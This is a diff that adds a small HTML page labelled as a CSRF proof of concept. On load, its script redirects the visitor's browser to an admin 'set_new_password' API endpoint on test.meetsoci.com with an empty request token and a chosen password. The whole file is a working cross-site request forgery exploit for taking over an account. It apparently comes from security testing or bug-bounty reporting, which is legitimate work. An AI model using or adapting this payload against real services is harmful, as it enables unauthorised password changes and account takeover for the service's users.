@@ -1,0 +1,8 @@
+<html>
+  <!-- CSRF PoC - Auto-submit GET version -->
+  <body>
+    <script>
+      window.location.href = "https://test.meetsoci.com/api/admin/0/set_new_password?request_token=&password=Testingtest123!";
+    </script>
+  </body>
+</html>
